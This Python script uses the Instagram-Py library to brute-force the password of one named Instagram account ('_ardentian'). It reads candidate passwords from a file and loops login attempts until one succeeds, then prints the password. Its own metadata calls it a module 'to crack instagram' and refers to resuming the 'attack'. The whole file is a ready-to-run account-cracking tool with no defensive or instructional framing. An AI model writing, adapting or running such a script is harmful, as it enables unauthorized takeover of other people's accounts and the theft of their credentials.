from InstagramPy.InstagramPyCLI import InstagramPyCLI
from InstaPy import InstagramPySession , DEFAULT_PATH
from InstagramPy.InstagramPyInstance import InstagramPyInstance
from datetime import datetime

username = "_ardentian"
password = "passwords.json"

appInfo = {
   "version"     : "0.0.1",
   "name"        : "Instagram-Py Clone",
   "description" : "Some Module to crack instagram!",
   "author"      : "YourName",
   "company"     : "YourCompany",
   "year"        : "2017",
   "example"     : ""
}

cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)

'''
# USE THIS IF YOU WANT
cli.PrintHeader()
cli.PrintDatetime()
'''
session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)
session.ReadSaveFile(True) # True to countinue attack if found save file.
'''
# USE THIS IF YOU WANT
cli.PrintMagicCookie(session.magic_cookie)
'''

'''
 Defining @param cli = None will make Instagram-Py run silently so you
 can you use your own interface if you like.
 or if you want to use the official interface then declare like this

 instagrampy = InstagramPyInstance(cli = cli , session = session)

'''

instagrampy = InstagramPyInstance(cli = None ,session = session)
while not instagrampy.PasswordFound():
       print('Trying... '+session.CurrentPassword())
       instagrampy.TryPassword()

if instagrampy.PasswordFound():
       print('Password Found: '+session.CurrentPassword())

exit(0)